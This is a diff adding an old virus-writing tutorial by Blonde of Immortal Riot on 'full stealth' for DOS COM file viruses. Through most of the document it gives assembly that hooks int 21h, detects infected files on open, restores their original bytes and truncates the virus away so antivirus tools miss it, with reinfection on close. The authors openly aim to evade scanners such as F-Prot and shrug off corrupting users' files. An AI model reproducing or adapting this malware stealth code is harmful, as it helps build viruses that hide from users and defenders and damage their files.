@@ -1,0 +1,254 @@
+% Full stealth tutorial by Blonde %
+컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�
+What follows is kinda tutorial of disinfection-stealth. It
+doesn't cover any *redirection* stealth (such as the one Bluenine
+in IR#6 uses), and quite frankly it might not be the best tutorial
+the vx-community has seen, but we can always hope it's for some
+gain to someone.
+
+Alternative code how physical disinfection can be done is presented
+in my Hybris virus, which also is a bit more optimized than this one :-).
+Nevertheless, this is the very same technique my Petra.1308 virus used,
+so atleast it works..
+
+I've edited this one a bit (Yea, I know it doesn't look like I did,
+but I did!) and well, we can always hope Mr.Blonde will write his
+next tutorial in a sober-mode :-).
+
+- The Unforgiven.
+
+
+
+
+             - Full Stealth or Disinfection on open -
+                 Written by Blonde/Immortal Riot
+
+
+
+
+
+Introduction
+컴컴컴컴컴컴
+Okey, this is for those guys who've already made an effective size-stealth
+and want some more or those who just like reading ;)
+
+Full stealth for me is when you completely remove the virus from the file.
+Preferebly done when you open it. The idea behind this is ofcourse that it
+will be harder to spot and it is for the common users, but thats all we want
+isn't it?
+
+What's very important when using disinfection is to infect on close or else
+you'll of course end up with some major problems ;) Okey, this is a bit more
+complex than the size stealth I discussed in my earlier article and I'm not
+a teacher so this can be quite hard to understand.
+
+I'll mainly go through the disinfection of a COM file, but with
+pseudo code for EXE files as well. All code presented will though be COM-
+only.
+
+The basic idea behind disinfection of COM-files is to first of all check
+if the file is infected by your virus, then simply restore what we've changed
+in the file, that is the first 3-5 bytes in a COM and then simply truncate
+the file at (filesize-virussize).
+
+As for EXE-files the scenario is exactly the same, restore what you
+changed in the EXE-header rewrite it to the file... and truncate it.
+
+
+To succeed in these matters you'll have to hook int 21h and tap ah=3d (open)
+
+
+Check-For-Infection
+컴컴컴컴컴컴컴컴컴�
+disinfect_3d:           ;called by our int handler if ah=3dh
+
+                    ;Upon entry to ah=3Dh ds:dx points to the filename...
+
+
+        push ax bx cx dx di si ds es            ;save registers in use
+
+        push ds
+        pop es  ;es=ds
+        mov di,dx
+        mov al,'.'
+        mov cx,64
+        repne scasb             ;this will repeatedly scan byte by byte for
+                    ; '.' in the filename stored in ds:dx=es:di
+                    ;di will then point to offset of '.'+1
+
+        cmp word ptr ds:[di],'OC'
+        jne nocom
+        cmp word ptr ds:[di],'M'
+        je openfile                     ;check if it is a com... if it wasn't
+      nocom:
+        jmp not_opened                  ;it wasn't a *.com file so don't
+                                        ;disinfect
+
+      openfile:                         ;com-file being opened!
+        pushf
+        push cs
+        mov ax,3d02h
+        call org21h                     ;open file in read/write mode
+        jc nocom                        ; error ==> bail out
+
+        xchg ax,bx
+
+        push cs cs                      ;cs=ds=es
+        pop es ds
+
+        mov ax,5700h                    ;get file's time & date
+        int 21h
+        push cx                         ;save time &
+        push dx                         ;date on the stack
+
+      read_4f:
+        mov ah,3fh                      ;just read the firstfour bytes to
+        mov cx,4                        ;a buffer.
+        mov dx,(hostbytes-vstart)
+        int 21h
+
+      chk_4_markers:
+        cmp byte ptr ds:[hbytes-vstart],0e9h            ;check if firstchar
+
+        jne close_file                                  ;is a jmp (e9)
+                                                        ;if not ==> bail!
+
+        cmp byte ptr ds:[hbytes-vstart+3],fileid        ;4th byte = our marker?
+
+        jne close_file                                  ; if not ==> bail!
+
+
+That was the first part of the disinfection routine, the part that check if
+the file *really* is infected. In a nutshell, the code works like this:
+
+First of all we want to check if the file first of all is a COM/EXE file.
+
+What we did was simply to scan ds:dx for the '.' which separates the filename
+from the file extension and then compare it to COM/EXE (the code only checks
+for com's, but you can fix that ;). That'll be sufficent to determine if it
+was a COM/EXE file...
+
+The next step would be to check if the COM/EXE file really is infected.
+This can be done in diffrent ways and some more secure than others, but what
+I've done in this code is to read the  first four bytes and check the first
+against a jmp instruction (the one which jumps to the first instruction in
+the main virus-code) and then check the fourth against 'fileid' a byte which
+I write to every file I infect... com only of course.
+
+That should do it. To be even more secure one could check for size and
+even stealth markers (like seconds) and such, but I don't think it's so
+very likely that a com file starts first with a jmp and then as the forth
+byte have another byte equal to what we want... Ah well it might corrupt
+some files, but who cares? ;)
+
+Note that we don't do a regular open, since that would be recursive we have to
+call the original interrupt handler directly...
+
+To do the same for EXE-files is almost as easy... read the whole header
+(be sure to save the header-information in the file for this purpose,
+don't do any heap-optimizing) and check against your markers maybe the
+prelocated SP or maybe the negative checksum or whatever... then continue
+with the disinfection where we left the com files...
+
+Restore Init-Bytes
+컴컴컴컴컴컴컴컴컴
+      read_hostbytes:
+        mov ax,4202h
+        xor cx,cx
+        cwd
+        int 21h                         ;ax=fsize
+
+        push ax                         ;push fsize.. used lateron...
+                        ;if exe then push dx too
+        xchg ax,dx
+
+        sub dx,(vend-hbytes)
+        mov ax,4200h
+        xor cx,cx
+        int 21h                         ;goto dx in files...
+
+        mov ah,40h
+        mov cx,4
+        mov dx,(hbytes-vstart)
+        int 21h                         ;read host bytes from end of file...
+
+This is the part where you fetch the original values of infected file. Since
+this is important, also remember to leave the original bytes un-encrypted if
+the virus is encrypted. Else you'll have to decrypt them, which is pretty
+stupid. Encrypted full-stealth viruses might be considered a bit overdoing it,
+but well, that's up to you to decide. It's also wise to place the init-bytes
+at the end-of the file because that makes file-seek's operations shorter.
+
+Well anyways, first get the filesize in ax then load it in dx and sub dx with
+the byte difference from the very end of the virus to the begining of
+the hostbytes (in this case 4...) then go to that offset in the file ie.
+four bytes from the end and then read those four bytes which are the files
+original bytes... if it wasn't a COM I wouldn't xor cx,cx and I would also use
+a sbb cx,0 since fsize might be larger than 64k ;) else there isn't anymore
+differences. you'll just have to sub/read the appropriate number of bytes...
+
+The next step will be to restore those bytes to the begining of the file...
+
+        mov ax,4200h
+        xor cx,cx
+        cwd
+        int 21h                 ;go to beginning of file...
+
+        mov ah,40h
+        mov dx,(hbytes-vstart)
+        mov cx,4
+        int 21h                 ;restore them
+
+Well that' obvious, wasn't it?
+The EXE version would only differ if you didn't save the whole EXE-header,
+because then you would have to read it, then restore the real values and
+re-write it to file then... therefor is it easier to simply write the whole
+EXE-header to the end of the infected file, but that'll of course increase
+the size of the virus.
+
+Remove the virus from the host-file
+컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�
+To truncate the file at filesize-virussize we do this...
+
+        pop dx          ;this was push'd two snippets up and it's the file-size
+                        ;should also pop cx if it was an exe
+
+        mov ax,4200h
+        sub dx,virusize ;subtract the virus-size from the filesize
+        int 21h         ;go to filsize-virusize
+
+      truncate:
+        mov ah,40h
+        xor cx,cx
+        int 21h         ;this is the trick. to truncate simply write zero bytes
+                        ;to the file...
+
+Okey it's simple... restore the filesize we pushed earlier (both cx,dx if EXE)
+and then sub it with the virus size (don't forget sbb cx,0 if EXE...)
+Then go to that offset and write zero bytes to it, that'll truncate it...
+
+      close_dis:
+        mov ax,5701h
+        pop dx cx
+        int 21h         ;restore time/date stamp
+
+        mov ah,3eh
+        pushf
+        push cs
+        call org21h     ;close call to real int handler
+
+      no_opendis:
+        pop es ds si di dx cx bx ax
+        jmp org21h
+
+You're finished! just restore the time/date stamp and close the file...
+Just don't forget to close via a direct call to the real int 21 handler, since
+you wouldn't want to re-infect the file ;) then we chain into the real dos
+open since the virus has been removed!
+
+This code will successfully disinfect any file opened by ah=3Dh/int 21h, but
+there are other ways of opening files, one of them is extended open which
+F-Prot uses, ax=6c00h/int 21h. It's possible to trap it too, but then you'll
+have to deal with some minor snags. Like loading ds:dx with filename ... If
+you're intrested check out Salamander Four...
+
